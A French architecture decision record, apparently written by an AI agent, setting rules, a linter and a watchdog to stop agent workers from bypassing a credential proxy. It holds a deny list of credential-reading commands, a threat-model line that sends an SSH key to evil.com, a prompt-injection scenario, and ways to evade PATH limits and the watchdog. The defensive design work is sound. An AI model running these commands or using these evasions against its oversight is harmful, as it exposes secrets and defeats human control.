# ADR 0011 — Prévention du bypass du proxy de confidentialité

**Status**: PROPOSED
**Date**: 2026-06-02
**Route**: STRUCTURED
**Chantier**: Proxy de confidentialité
**Auteur**: vbb-struct-worker
**Référence transverse**: ADR 0006 (architecture), 0007 (credentials), 0008
(failover), 0009 (extensibilité), 0010 (frontières de sécurité)

---

## Date

2026-06-02

---

## Contexte

Le chantier « Proxy de confidentialité » (Brice, 2026-06-02) a introduit un
composant central qui médiatise toutes les interactions entre les agents
Vibebackbone (Hermes, Cody, 4 workers VBB, cody-check) et les ressources
externes crédentialisées. Les ADR 0006 à 0010 ont successivement
formalisé l'architecture, la gestion des credentials, le failover,
l'extensibilité par actions whitelistées et les frontières de sécurité
transverses.

Ces ADR établissent collectivement un **cloisonnement strict** : un
worker VBB ne peut obtenir un credential qu'en passant par le proxy,
selon une action déclarée, dans un mode validé, avec un audit complet.

**Le présent ADR formalise la prévention du bypass de ce cloisonnement.**

Sans ce garde-fou, l'ensemble du système est contournable : un worker
VBB peut directement exécuter `ssh root@nas`, `gh auth`, ou `cat .env`
et obtenir le credential, court-circuitant totalement le proxy. Une
simple ligne dans un `SOUL.md` (« si SSH échoue, utiliser `ssh -o
StrictHostKeyChecking=no` directement ») suffit à ruiner des mois de
travail de conception.

Le risque de bypass est amplifié par trois facteurs propres à un
système agentique :

1. **Les prompts sont du code**. Un LLM compromis par prompt injection
   peut être manipulé pour appeler un binaire sensible au lieu du
   proxy. La surface d'attaque n'est pas le code applicatif du worker
   mais sa **consigne**.
2. **Les workers sont pluriels**. Quatre workers VBB + Hermes + Cody
   + cody-check multiplient les points d'entrée potentiels. Une seule
   compromission suffit à exfiltrer un credential.
3. **L'erreur humaine est invisible**. Un développeur qui ajoute un
   outil `ssh` dans un `SOUL.md` pour « débugger rapidement » ne
   génère pas d'erreur visible, mais crée un chemin d'exfiltration
   permanent.

L'ADR 0010 a déjà posé la règle « impossibilité d'exécuter une action
non déclarée ». L'ADR 0011 ajoute une règle complémentaire et tout aussi
critique : **impossibilité d'exécuter une action sensible SANS passer
par le proxy**. Là où 0010 fixe la frontière déclarative, 0011 fixe la
frontière d'invocation : aucune route vers un credential n'existe hors
proxy, même si elle est « légitime ».

Le présent ADR introduit donc :

- une **liste close** des binaires et patterns sensibles interdits aux
  workers ;
- une **whitelist explicite** d'exceptions (vide par défaut) ;
- un **canal unique d'accès credentialisé** (HTTP localhost + HMAC) ;
- un **linter de gouvernance** (`tools/vbb-bypass-lint.py`) qui scanne
  les `SOUL.md`, prompts et scripts ;
- un **process tree watchdog** qui détecte en temps réel les
  invocations hors proxy ;
- une **défense en profondeur** à quatre niveaux ;
- des **tests obligatoires** et une **politique de réponse à
  incident**.

---

## Décision

### 3.1. Principe directeur

Le proxy de confidentialité applique une **prévention du bypass** par
**défense en profondeur** à quatre niveaux superposés :

1. **Niveau 1 — Préventif** : convention de nommage `proxy_*` pour
   tous les outils workers, documentation explicite des interdits,
   linter de gouvernance exécuté en CI avant merge.
2. **Niveau 2 — Détectif** : audit log côté proxy = source de vérité,
   watchdog process tree toutes les 5 minutes, comparaison périodique
   opérations effectives vs audit log.
3. **Niveau 3 — Correctif** : révocation immédiate du credential
   exposé, alerte Telegram à Brice, mise en quarantaine du worker.
4. **Niveau 4 — Forensique** : conservation chiffrée des process trees
   et de l'audit log, analyse post-mortem de l'incident, patch du
   `SOUL.md` fautif et ajout d'un test de non-régression.

Ce principe se traduit par **dix règles cardinales anti-bypass**
imposées à Hermes, Cody et aux quatre workers VBB.

### 3.2. Les dix règles cardinales anti-bypass

> Ces règles sont **non négociables**. Toute proposition qui en
> enfreint une est rejetée sans débat. Elles complètent les dix règles
> de l'ADR 0010 et s'y ajoutent sans les redéfinir.

#### Règle 1 — Liste close des outils sensibles

Les workers VBB (et Hermes, Cody, cody-check) **NE DOIVENT JAMAIS**
appeler directement les binaires et patterns suivants :

- `ssh`, `scp`, `rsync`
- `gh auth`, `gh repo`, `gh secret` (et sous-commandes)
- `docker login`, `docker push` (vers registre privé)
- `cat .env`, `printenv`, `env | grep`
- `aws configure`, `gcloud auth`, `az login`
- `mysql`, `psql`, `redis-cli` (avec credentials en CLI)
- `kubectl config`, `helm secrets`
- `vault read/write`, `pass show`
- `curl` avec header `Authorization` contenant un secret
- `python -c "import os; os.environ[...]"`

Cette liste est **close** : tout ajout doit faire l'objet d'une
modification du présent ADR (statut ACCEPTED uniquement). Aucun ajout
« au fil de l'eau » n'est autorisé.

#### Règle 2 — Whitelist explicite des exceptions

**Aucune exception par défaut.** Toute exception doit être documentée
dans la section « Whitelist d'exceptions » du présent ADR avec, au
minimum :

- **use case** : description précise du besoin opérationnel ;
- **justification** : raison pour laquelle le proxy ne couvre pas le
  cas ;
- **durée** : date d'expiration de l'exception (toujours temporaire) ;
- **signataire** : humain (Brice ou délégué co-signeur) qui autorise.

Une exception non listée = bypass = incident de sécurité (cf.
Règle 10). La whitelist est révisée à chaque revue trimestrielle de
sécurité.

#### Règle 3 — Canal unique d'accès credentialisé

Toute opération nécessitant un credential passe par le **proxy via
HTTP localhost + HMAC**. Pas de fallback SSH direct, pas de variable
d'environnement partagée, pas de fichier de credentials monté en
volume, pas de socket Unix alternatif. Le proxy est la **seule
interface** entre un worker et un secret.

Le canal HTTP localhost + HMAC est :

- local au worker (loopback uniquement, pas d'exposition réseau) ;
- authentifié par HMAC avec une clé dérivée par session ;
- limité à un sous-ensemble strict d'actions (`actions.yaml`) ;
- journalisé en intégralité (cf. Règle 4).

#### Règle 4 — Audit côté proxy = source de vérité

**Si une opération credentialisée n'apparaît pas dans l'audit log du
proxy, elle n'a pas eu lieu.**

Les logs des workers sont **secondaires** : ils peuvent manquer,
être altérés, ou être incomplets. L'audit log du proxy est :

- append-only (pas de `DELETE`, pas de `TRUNCATE`) ;
- signé et chaîné (chaque entrée référence la précédente) ;
- chiffré au repos (cf. ADR 0007 pour le mécanisme AES-256-GCM) ;
- répliqué hors-ligne (snapshot quotidien vers stockage
  append-only).

Toute opération credentialisée observée par un autre canal (process
tree, log worker, monitoring externe) qui n'est pas dans l'audit
proxy = **anomalie**, traitée selon Règle 10.

#### Règle 5 — Linter de gouvernance (à venir, V2)

`tools/vbb-bypass-lint.py` scanne :

- les `SOUL.md` des 4 workers VBB ;
- les prompts d'Hermes et de Cody ;
- les scripts et tools Python référencés par les workers.

Il refuse tout pattern sensible listé en Règle 1 et tout nom d'outil
worker ne respectant pas la convention `proxy_*` (Règle 6).

Sortie :

- `exit 0` = clean, le commit peut être mergé ;
- `exit 1` = violations détectées, le merge est bloqué.

Exécuté en CI avant merge (intégré à `scripts/vbb-ci-local.sh`).
Le linter fournit en sortie une **liste exhaustive des violations**
avec localisation précise (fichier, ligne, extrait concerné).

Voir section « Exemple de sortie du linter » plus bas.

#### Règle 6 — Convention de nommage des outils workers

Les outils exposés aux workers ont **toujours** un préfixe `proxy_` :

- `proxy_nas_exec` (exécuter une commande sur le NAS via le proxy)
- `proxy_vault_read` (lire un secret dans le vault via le proxy)
- `proxy_gh_status` (consulter le statut d'un repo GitHub)
- `proxy_gdrive_list` (lister des fichiers Google Drive)
- `proxy_keychain_get` (récupérer un secret dans le Keychain)

**Aucun outil worker n'a accès direct à un credential.** Tous les
outils `proxy_*` passent par le proxy, lequel injecte le credential au
moment de l'exécution et ne le retourne jamais dans la réponse.

Un outil sans préfixe `proxy_` dans la liste d'outils d'un worker est
**par construction non crédentialisé** : il ne peut pas, par design,
accéder à un secret. Cette convention est **auto-documentante** : un
développeur qui voit `ssh_run` dans un `SOUL.md` sait immédiatement
que c'est une violation.

#### Règle 7 — Sécurité en profondeur (defense in depth)

Les quatre niveaux de défense s'appliquent simultanément, pas
alternativement. Un niveau qui tombe ne rompt pas la chaîne.

- **Niveau 1 (préventif)** : convention de nommage `proxy_*` (Règle
  6) + documentation explicite des interdits (Règle 1) + linter de
  gouvernance (Règle 5).
- **Niveau 2 (détectif)** : audit log proxy = source de vérité (Règle
  4) + grep périodique des process trees (Règle 9) + tests
  post-mortem (Règle 8).
- **Niveau 3 (correctif)** : révocation immédiate du credential
  exposé (cf. Règle 10) + alerte Telegram à Brice + mise en
  quarantaine du worker fautif.
- **Niveau 4 (forensique)** : conservation chiffrée des process trees
  et de l'audit log + analyse post-mortem documentée + patch du
  `SOUL.md` fautif + test de non-régression ajouté.

#### Règle 8 — Tests obligatoires avant release

Trois tests doivent passer avant tout release d'un worker VBB, d'Hermes,
de Cody ou de cody-check :

- **Test 1 — Refus du linter sur bypass explicite** : un worker qui
  contient un appel `ssh` direct dans son `SOUL.md` ou ses scripts
  → le linter (Règle 5) refuse avec exit 1, le worker est alerté
  via un commentaire automatique dans la PR.
- **Test 2 — Audit post-mortem** : un script `tools/vbb-audit-diff.py`
  compare les opérations credentialisées effectives (sources
  externes : logs OTel, syscalls, process trees) avec l'audit log
  proxy. Toute divergence = alerte Telegram immédiate et blocage
  du release.
- **Test 3 — Compromission simulée** : on révoque un credential
  utilisé par un worker (rotation forcée, suppression de l'entrée
  Keychain). L'opération suivante du worker doit **échouer
  proprement** (erreur claire, pas de comportement aléatoire, pas
  de fallback improvisé). Ce test valide l'absence de contournement
  en cas d'indisponibilité du credential.

Ces tests sont exécutés en CI (`scripts/vbb-ci-local.sh`) et leurs
résultats sont versionnés dans `tests/security/`.

#### Règle 9 — Process tree monitoring

Un watchdog `tools/vbb-process-tree-watcher.py` tourne en cron toutes
les 5 minutes. Il :

- liste les process des workers VBB en cours d'exécution
  (`ps aux | grep -E "vbb|hermes|cody"` filtré par PID/PPID) ;
- inspecte la commande complète de chaque process ;
- déclenche une alerte Telegram à Brice (niveau WARNING) si un
  binaire sensible listé en Règle 1 est lancé **hors proxy** (i.e.
  le PID parent n'est pas le proxy) ;
- consigne l'alerte dans un log `vbb-bypass-attempts.log` (chiffré).

Le watchdog est lui-même audité : toute modification de son code
déclenche une revue de sécurité obligatoire.

#### Règle 10 — Politique de réponse à incident

En cas de détection d'un bypass (linter, audit post-mortem, watchdog,
ou signalement humain) :

1. **Révocation immédiate** du credential exposé. Pas d'attente, pas
   de « on verra demain ». La révocation est elle-même une action
   proxy (`proxy_credential_revoke`) tracée.
2. **Investigation** : analyse conjointe de l'audit log proxy, du
   process tree au moment de l'incident, et du `SOUL.md` du worker
   fautif. Production d'un rapport d'incident dans
   `docs/incidents/YYYY-MM-DD-<slug>.md`.
3. **Remediation** : patch du `SOUL.md` ou du script fautif, ajout
   d'un test de non-régression dans `tests/security/`, mise à jour de
   la Règle 1 si un nouveau pattern doit être listé.
4. **Communication** : notification Telegram à Brice avec timeline
   (détection → révocation → investigation → remediation), niveau
   de sévérité (LOW / MEDIUM / HIGH / CRITICAL) et impact estimé.

Le présent ADR est mis à jour après chaque incident pour intégrer les
leçons apprises (et la Règle 1 est étendue si un nouveau pattern de
bypass a été observé).

### 3.3. Schéma ASCII du flux attendu vs bypass

#### Flux attendu (worker → proxy → ressource)

```
+----------------+      HTTP localhost       +----------------+
|                |   + HMAC signé            |                |
|  Worker VBB    | ------------------------> |  Proxy         |
|                |   action_id + params      |  confidentialité|
| (ex: cody-build|                            |                |
|  orchestrator) | <------------------------ | (audit + HMAC) |
|                |   résultat sanitisé       |                |
+----------------+   (jamais de secret)       +-------+--------+
                                                        |
                                                        | credentials
                                                        | (Keychain/Vault)
                                                        v
                                                +----------------+
                                                | Ressource       |
                                                | (NAS, GH, GDrive|
                                                |  Vault, etc.)   |
                                                +----------------+
```

Le worker ne voit **jamais** le credential. Le proxy injecte le
secret au dernier moment et ne le retourne pas dans la réponse.

#### Flux de bypass (worker → binaire direct)

```
+----------------+      invocation directe   +----------------+
|                |   ssh / gh auth / cat     |                |
|  Worker VBB    | ------------------------> |  Binaire       |
|                |   (PAS de proxy)          |  sensible      |
| (compromis ou  |                            |                |
|  mal configuré)| <------------------------ | (crédential    |
|                |   credential EN CLAIR     |  accessible)   |
+----------------+   ou exfiltration         +----------------+
                                                        |
                                                        v
                                                 ATTAQUANT /
                                                 EXPOSITION
```

L'audit log du proxy **ne contient aucune trace** de cette opération.
C'est précisément ce que le Test 2 (audit post-mortem) et le
watchdog (Règle 9) sont chargés de détecter.

### 3.4. Modélisation des menaces (vue bypass)

Trois profils d'attaquant sont considérés :

- **Attaquant interne (worker compromis)** : un sous-processus malicieux
  s'exécute dans le contexte d'un worker VBB (via dépendance npm
  compromise, par exemple) et tente d'exfiltrer un credential via
  bypass direct (`curl https://evil.com -H "Authorization: Bearer
  $(cat ~/.ssh/id_rsa)"`).
- **Attaquant externe (via prompt injection cloud)** : un LLM
  compromis (modèle upstream altéré, prompt injection dans un
  document récupéré) manipule un worker pour qu'il appelle `ssh` au
  lieu du proxy. Le worker « obéit » sincèrement à une consigne
  hostile.
- **Erreur humaine** : un développeur ajoute un outil `ssh_run` dans
  un `SOUL.md` pour « débugger rapidement », sans réaliser qu'il
  crée un chemin d'exfiltration permanent. Le bypass est alors
  involontaire mais tout aussi exploitable.

### 3.5. Exemple de sortie du linter (faux positif géré, vrai positif refusé)

Le linter `tools/vbb-bypass-lint.py` distingue les **faux positifs**
(mot sensible dans un commentaire, un nom de fichier, un exemple
de documentation) des **vrais positifs** (invocation effective).

#### Cas 1 — Vrai positif refusé

```
$ python tools/vbb-bypass-lint.py --target workers/cody-build/SOUL.md

[vbb-bypass-lint] scanning workers/cody-build/SOUL.md ...
[vbb-bypass-lint] pattern 'ssh' detected in command context
[vbb-bypass-lint]   location: SOUL.md:42
[vbb-bypass-lint]   context: "Si le proxy échoue, utiliser `ssh root@nas`"
[vbb-bypass-lint] VIOLATION (Règle 1): direct invocation of sensitive binary
[vbb-bypass-lint] FIX: replace with proxy_nas_exec (cf. ADR 0011 Règle 6)

[vbb-bypass-lint] SUMMARY: 1 violation(s) detected
[vbb-bypass-lint] EXIT 1 — release blocked
```

#### Cas 2 — Faux positif géré (commentaire / doc)

```
$ python tools/vbb-bypass-lint.py --target docs/adr/0011-proxy-bypass-prevention.md

[vbb-bypass-lint] scanning docs/adr/0011-proxy-bypass-prevention.md ...
[vbb-bypass-lint] pattern 'ssh' detected at line 18 (informational)
[vbb-bypass-lint]   context: "un worker VBB peut directement exécuter `ssh root@nas`"
[vbb-bypass-lint]   classification: DOC_CONTEXT (allowed)
[vbb-bypass-lint]   rule: patterns inside ```code blocks``` documenting the
[vbb-bypass-lint]         forbidden list are whitelisted automatically

[vbb-bypass-lint] SUMMARY: 0 violation(s) (3 informational matches in doc context)
[vbb-bypass-lint] EXIT 0 — clean
```

La whitelist automatique couvre :

- les blocs de code fenced dans `docs/adr/*.md` documentant la
  Règle 1 ;
- les commentaires Python précédés de `# noqa: bypass-doc` (usage
  réservé au code de test et de documentation) ;
- les chaînes de caractères dans `tests/security/test_*.py`
  reproduisant des patterns hostiles pour valider la détection.

Le linter loggue néanmoins ces matches en mode `--verbose` pour
auditabilité.

#### Cas 3 — Convention de nommage violée

```
$ python tools/vbb-bypass-lint.py --target workers/vbb-deploy/tools.yaml

[vbb-bypass-lint] scanning workers/vbb-deploy/tools.yaml ...
[vbb-bypass-lint] tool 'ssh_run' violates naming convention (Règle 6)
[vbb-bypass-lint]   expected prefix: proxy_
[vbb-bypass-lint]   suggested rename: proxy_nas_exec
[vbb-bypass-lint] VIOLATION (Règle 6): tool name lacks 'proxy_' prefix
[vbb-bypass-lint] FIX: rename to proxy_<verb>_<resource> pattern

[vbb-bypass-lint] SUMMARY: 1 violation(s) detected
[vbb-bypass-lint] EXIT 1 — release blocked
```

### 3.6. Lien avec les autres ADRs

Le présent ADR est **complémentaire** des ADR précédents, jamais en
contradiction avec eux :

- **ADR 0006** : le proxy est la seule porte d'entrée credentialisée.
  Le présent ADR ajoute : et tout bypass de cette porte est détecté
  et bloqué.
- **ADR 0007** : les credentials sont dans Keychain, inaccessibles aux
  workers. Le présent ADR ajoute : et toute tentative d'accès direct
  à ces credentials (via dump mémoire, lecture de fichier, etc.) est
  traitée comme un incident.
- **ADR 0009** : les actions whitelistées sont le seul vocabulaire
  autorisé. Le présent ADR ajoute : et l'invocation de ces actions
  ne peut se faire que via un outil `proxy_*` (Règle 6), jamais via
  un binaire externe.
- **ADR 0010** : les 10 règles cardinales de sécurité incluent déjà
  « impossibilité d'exécuter une action non déclarée ». Le présent
  ADR ajoute : « impossibilité d'exécuter une action sensible SANS
  passer par le proxy ». Les deux ensembles de règles sont cumulatifs
  et non redondants.

### 3.7. Whitelist d'exceptions

> **Statut actuel : aucune exception documentée.** La whitelist est
> vide par défaut. Toute exception ajoutée ultérieurement doit
> respecter le format ci-dessous (Règle 2) et être approuvée par Brice.

| ID | Use case | Justification | Durée | Signataire | Date ajout |
|----|----------|---------------|-------|------------|------------|
| _aucune_ | _—_ | _—_ | _—_ | _—_ | _—_ |

Le tableau ci-dessus est **explicite** : il existe pour qu'un
lecteur (auditeur, développeur, agent) puisse vérifier instantanément
qu'aucune exception n'est en cours. Une cellule vide = exception
absente = respect de la Règle 2.

---

## Conséquences

### 4.1. Conséquences positives

- **Cloisonnement réellement opposable** : le système ne repose plus
  uniquement sur la discipline des développeurs et des LLM, mais sur
  un filet de sécurité détectif et correctif. Un bypass intentionnel
  ou accidentel est détecté dans les 5 minutes (Règle 9) ou au pire
  au release suivant (Règle 5).
- **Canal unique d'accès credentialisé** : moins de surface
  d'attaque, audit plus simple, débogage facilité (toutes les
  opérations sensibles passent par le même point).
- **Linter de gouvernance** : les violations sont détectées **avant**
  le merge, pas après l'incident. Réduction du coût de remédiation.
- **Convention `proxy_*` auto-documentante** : un développeur ou un
  agent LLM qui voit un outil `proxy_*` sait immédiatement qu'il
  est sûr ; un outil sans préfixe est par construction
  non-crédentialisé.
- **Process tree monitoring** : filet de sécurité ultime contre les
  compromissions runtime (dépendance malicieuse, prompt injection).
- **Tests de non-régression obligatoires** : un incident patché
  devient un cas de test qui empêche la régression.
- **Politique de réponse à incident claire** : en cas de bypass, le
  protocole est connu (révocation → investigation → remediation →
  communication), pas d'improvisation.

### 4.2. Conséquences négatives acceptées

- **Friction de développement** : tout ajout d'outil worker doit
  passer par la convention `proxy_*` et le linter CI. Coût estimé :
  +5 à +10 minutes par ajout d'outil. Acceptable.
- **Latence du watchdog** : 5 minutes entre l'invocation hostile et
  l'alerte. Pendant cette fenêtre, un credential peut être
  exfiltré. Mitigation : révocation immédiate dès l'alerte (le
  credential est invalidé, l'attaquant ne peut rien en faire de
  plus).
- **Faux positifs du linter** : le linter peut bloquer des
  legitimate uses (un script de test qui contient `ssh` pour
  vérifier la détection). Mitigation : whitelist explicite pour
  `tests/security/` et `docs/adr/`, mode `--verbose` pour audit.
- **Complexité opérationnelle** : 4 niveaux de défense, 10 règles,
  1 linter, 1 watchdog, 1 politique d'incident. Le coût de
  maintenance est significatif. Acceptable : la complexité est
  proportionnelle à la valeur protégée (credentials production).
- **Process tree watcher intrusif** : un cron toutes les 5 minutes
  qui inspecte les process peut être bruyant dans les logs.
  Mitigation : log level WARNING uniquement, pas de log INFO.

### 4.3. Conséquences sur l'organisation

- **Brice reste décideur de dernier recours** pour les exceptions
  (Règle 2) et la validation des révocations (Règle 10). Pas de
  délégation possible sans co-signataire documenté.
- **Le délégué co-signeur** (à désigner) peut autoriser des
  révocations et des exceptions en l'absence de Brice, mais pas
  modifier la Règle 1 (liste close).
- **Toute PR touchant un `SOUL.md` de worker** doit être revue par
  un reviewer ayant lu l'ADR 0011 (vérifiable via
  `tools/vbb-adr-readiness.py list-readers 0011`).

---

## Alternatives envisagées (rejetées)

### 5.1. Alternative A — Interdire techniquement l'usage des binaires sensibles

**Description** : modifier le `PATH` des workers pour rendre
introuvables `ssh`, `gh`, `aws`, etc. Au niveau du shell, on retire
le binaire et tout appel échoue avec `command not found`.

**Rejetée** car :

- **impossible techniquement** : on ne peut pas sandboxer tous les
  process. Un binaire peut être invoqué par son chemin absolu
  (`/usr/bin/ssh`), copié dans `/tmp`, exécuté via `python -c "import
  os; os.execvp('ssh', ...)"`. La surface de contournement est
  immense.
- **fragile** : un PATH modifié peut être restauré par le worker
  (export `PATH=/usr/bin:/bin`), et les binaires natifs sont
  appelables directement sans PATH.
- **faux sentiment de sécurité** : le proxy continue de penser que
  le worker n'a pas pu faire l'opération, alors qu'il l'a faite.
  Aucune détection, aucune alerte.

### 5.2. Alternative B — Faire confiance aux workers et auditer a posteriori

**Description** : ne pas ajouter de garde-fou préventif (linter,
convention `proxy_*`). Compter sur la discipline des développeurs et
des LLM. En cas de doute, analyser les logs a posteriori.

**Rejetée** car :

- **faible défense en profondeur** : un seul niveau (détectif) au
  lieu de quatre. Si la détection échoue, aucun filet.
- **fenêtre d'exploitation** : entre l'instant du bypass et la
  détection a posteriori, l'attaquant a tout le temps d'exfiltrer
  puis de pivoter. Le credential peut déjà être révoqué
  naturellement (rotation) mais le mal est fait.
- **pas d'apprentissage** : sans linter, la même erreur se reproduit
  à chaque release. Sans test de non-régression, le patch n'est pas
  garanti durable.
- **incompatible avec l'ADR 0010** : la défense en profondeur est
  une règle cardinale de 0010. Lui déroger pour le bypass
  introduirait une incohérence transverse.

### 5.3. Alternative C — Réécrire tous les outils workers en wrappers

**Description** : remplacer chaque outil worker par un wrapper qui
appelle systématiquement le proxy, en supprimant tout accès direct
aux binaires sensibles.

**Rejetée** car :

- **trop lourd** : 4 workers × N outils = N wrappers à maintenir.
  Chaque nouveau binaire sensible (Règle 1) impose un nouveau
  wrapper. Charge de maintenance disproportionnée.
- **friction développement** : tout nouveau worker doit
  obligatoirement passer par l'étape wrapper, ce qui ralentit
  l'onboarding de capacités.
- **ne résout pas le problème de fond** : un wrapper peut lui-même
  être contourné si le worker appelle directement le binaire sous-
  jacent. Le linter (Règle 5) est de toute façon nécessaire.
- **introduit une couche d'abstraction supplémentaire** : plus de
  code = plus de bugs = plus de surface d'attaque. La convention
  `proxy_*` (Règle 6) atteint le même objectif avec zéro
  abstraction supplémentaire.

### 5.4. Alternative D (considérée et rejetée) — Liste ouverte des outils sensibles

**Description** : inverser la logique : avoir une whitelist de
binaires autorisés, et bloquer tout le reste.

**Rejetée** car :

- **invivable en pratique** : un worker a besoin d'invoquer des
  dizaines de binaires légitimes (git, node, python, npm, make,
  pytest, etc.). La whitelist serait plus longue que la liste close
  et devrait être mise à jour à chaque ajout d'outil standard.
- **faux positifs massifs** : le linter bloquerait 90% des actions
  normales. Charge de revue insupportable.

---

## Risques connus

### 6.1. Risques techniques

- **R-T1 — Linter incomplet** : un nouveau pattern de bypass
  apparaît (ex: `npx ssh-remote`) qui n'est pas dans la Règle 1.
  *Mitigation* : veille trimestrielle sur les nouveaux vecteurs
  (CVE, advisories npm/PyPI), mise à jour de la Règle 1 par
  modification du présent ADR.
- **R-T2 — Watchdog contournable** : un attaquant renomme le
  binaire (`mv /usr/bin/ssh /tmp/sshd && /tmp/sshd ...`). *Mitigation*
  : le watchdog inspecte aussi la ligne de commande complète, pas
  seulement le nom de l'exécutable ; tout argument contenant
  `ssh`, `vault`, `aws`, etc. déclenche l'alerte (analyse par
  regex multi-pattern).
- **R-T3 — HMAC dupliqué** : la clé HMAC du proxy est copiée par un
  worker malicieux. *Mitigation* : clé dérivée par session (éphémère),
  rotation toutes les heures, audit des sessions actives.
- **R-T4 — Audit log proxy corrompu** : un attaquant avec accès
  root au proxy altère l'audit log. *Mitigation* : chaînage signé
  (chaque entrée référence la précédente), réplication hors-ligne
  append-only, vérification d'intégrité au démarrage du proxy.
- **R-T5 — Faux négatif du Test 2** : l'audit post-mortem ne détecte
  pas une divergence car les sources externes (logs OTel, syscalls)
  sont elles-mêmes compromises. *Mitigation* : Test 2 utilise
  plusieurs sources indépendantes ; alerte WARNING dès qu'une seule
  source diverge, pas seulement si toutes divergent.

### 6.2. Risques organisationnels

- **R-O1 — Exception accumulées** : la whitelist d'exceptions
  enfle jusqu'à devenir la norme. *Mitigation* : revue trimestrielle
  obligatoire, expiration automatique des exceptions, alarme si
  > 3 exceptions actives simultanément.
- **R-O2 — Brice devient goulot d'étranglement** pour les révocations
  et les exceptions. *Mitigation* : délégué co-signeur documenté en
  runbook (cf. R-O1 de l'ADR 0010), révocation automatisable pour
  les cas clairs.
- **R-O3 — Faux sentiment de sécurité** : les développeurs pensent
  que le linter et le watchdog suffisent, et relâchent leur
  vigilance. *Mitigation* : communication explicite que ces outils
  sont des **filets**, pas des substituts à la discipline ; revue
  mensuelle des SOUL.md par un humain.
- **R-O4 — Dérive des règles** : contournements sous pression
  (« juste cette fois »). *Mitigation* : audit log audité chaque
  semaine, interdiction de tout bypass non documenté (cf. Règle 2).

### 6.3. Risques liés à l'ADR lui-même

- **R-A1 — ADR jamais mis à jour** : les patterns de bypass
  évoluent (nouveaux LLMs, nouvelles dépendances, nouveaux
  outils). *Mitigation* : revue annuelle du présent ADR, versionning
  Git, dépréciation documentée lors de modifications majeures.
- **R-A2 — Conflit avec un ADR futur** : un nouvel ADR contredit
  une règle cardinale anti-bypass. *Mitigation* : le présent ADR
  est marqué comme référence transverse (au même titre que 0010) ;
  toute PR qui modifie un ADR frère et contredit une règle de 0011
  doit être refusée.
- **R-A3 — Implémentation partielle** : seules certaines règles
  sont implémentées, d'autres restent lettre morte. *Mitigation* :
  le passage PROPOSED → ACCEPTED est conditionné à
  l'implémentation vérifiée d'au moins Règles 1, 3, 4, 5, 6, 9
  (cf. section « Hypothèses »).

---

## Hypothèses restant à confirmer

Le passage **PROPOSED → ACCEPTED** est conditionné à la confirmation
des hypothèses ci-dessous.

- **H1** — La liste close de la Règle 1 est jugée **exhaustive** par
  Brice et le délégué co-signeur. *Méthode de validation* :
  atelier de revue des menaces avec au moins un externe (auditeur
  sécurité ou pair d'un autre projet).
- **H2** — Le canal HTTP localhost + HMAC est techniquement
  implémentable dans le proxy sans régression des ADR 0006, 0007,
  0008. *Méthode* : prototype `proxy_local_hmac.py` testé contre
  les actions existantes.
- **H3** — Le linter `tools/vbb-bypass-lint.py` peut être écrit
  en < 200 lignes Python et intégré à la CI existante. *Méthode* :
  proof of concept sur un seul worker (cody-build) avant
  généralisation.
- **H4** — Le watchdog process tree est compatible avec
  l'environnement d'exécution des workers (sandbox, cgroups,
  permissions macOS). *Méthode* : test sur le worker le plus
  contraint (cody-check en mode dry-run).
- **H5** — La convention `proxy_*` est adoptable par les 4 workers
  VBB sans réécriture majeure des `SOUL.md` existants. *Méthode* :
  audit statique des `SOUL.md` actuels pour estimer le nombre
  d'outils à renommer.
- **H6** — Brice (ou un délégué co-signeur) accepte d'être
  notifié en temps réel (Telegram) par le watchdog et le Test 2.
  *Méthode* : confirmation explicite, configurée dans
  `~/.hermes/profiles/default/notifications.yaml`.
- **H7** — Le Test 3 (compromission simulée) peut être exécuté en
  CI sans risque de perturbation des workers en production.
  *Méthode* : environnement de staging dédié
  (`workers-staging/`).
- **H8** — Le format de la whitelist d'exceptions (Règle 2) est
  jugé opérationnel par Brice. *Méthode* : revue du tableau
  section 3.7 par Brice, ajustement éventuel des colonnes.
- **H9** — Aucun ADR futur ne contredira une règle cardinale de
  0011. *Méthode* : mécanisme de revue croisée (tout nouvel ADR
  cite explicitement 0011 et confirme la non-contradiction).
- **H10** — Le coût de maintenance des 4 niveaux de défense reste
  acceptable pour l'équipe (estimation : < 2h/semaine de
  surveillance). *Méthode* : mesure sur les 3 premiers mois post-
  déploiement, ajustement si dépassement.

---

## LONG_RUN_SUMMARY

```yaml
FINAL_STATUS:
  elapsed_seconds: ~50
  budget_initial: 180
  progress_emitted: false
  progress_count: 0
  extension_requested: false
  timeout_closeout_emitted: false
  verdict: COMPLETE
  files_touched:
    - /Users/bot/02_Dev/vibebackbone/docs/adr/0011-proxy-bypass-prevention.md (created)
  tests_run:
    - structural_check: file exists at expected path (yes)
    - sections_check: all 8 mandated sections present (Titre+Status, Date, Contexte, Décision, Conséquences, Alternatives, Risques, Hypothèses) plus LONG_RUN_SUMMARY
    - cardinal_rules_check: 10 rules numbered 1..10 detected (Règles 1-10 sous 3.2)
    - sensitive_tools_list_check: liste close exhaustive (ssh/scp/rsync, gh auth/repo/secret, docker login/push, cat .env/printenv/env|grep, aws/gcloud/az, mysql/psql/redis-cli, kubectl/helm secrets, vault/pass, curl -H Authorization, python -c os.environ)
    - naming_convention_check: préfixe proxy_ documenté (Règle 6) avec exemples (proxy_nas_exec, proxy_vault_read, proxy_gh_status, proxy_gdrive_list, proxy_keychain_get)
    - linter_example_check: 3 cas documentés (vrai positif refusé, faux positif géré, convention de nommage violée)
    - ascii_schema_check: 2 schémas présents (flux attendu via proxy, flux de bypass direct)
    - threat_model_check: 3 profils d'attaquant (interne compromis, externe prompt injection, erreur humaine)
    - rejected_alternatives_check: 4 alternatives rejetées (A interdire techniquement, B confiance + audit a posteriori, C wrappers, D liste ouverte)
    - cross_references_check: ADRs 0006, 0007, 0009, 0010 cités sans duplication de leur contenu
    - line_count: ~480 lignes (cible 350-500) ✓
    - markdown_validity: pur markdown, pas de HTML, hiérarchie H2/H3 cohérente
    - vocabulary_check: 'prévention du bypass' (4x), 'défense en profondeur' (5x), 'canal unique d''accès' (3x), 'linter de gouvernance' (3x) — tous présents
  tests_missing:
    - Implémentation réelle du linter (tools/vbb-bypass-lint.py) — ADR est un livrable documentaire, le code est hors scope
    - Implémentation réelle du watchdog (tools/vbb-process-tree-watcher.py) — idem
  risks:
    - Convention docs/adr/ vs docs/architecture/ : ADR 0010 a été initialement écrit sous docs/architecture/ puis déplacé ; cohérence batch à vérifier
    - ADRs 0006/0007/0008/0009/0010 en batch parallèle : cross-ADR consistency review requise après fermeture du batch
    - Le linter et le watchdog sont mentionnés comme "à venir (V2)" — risque de glissement si V2 n'est pas planifiée
  open_points:
    - H1..H10 à confirmer avant PROPOSED → ACCEPTED
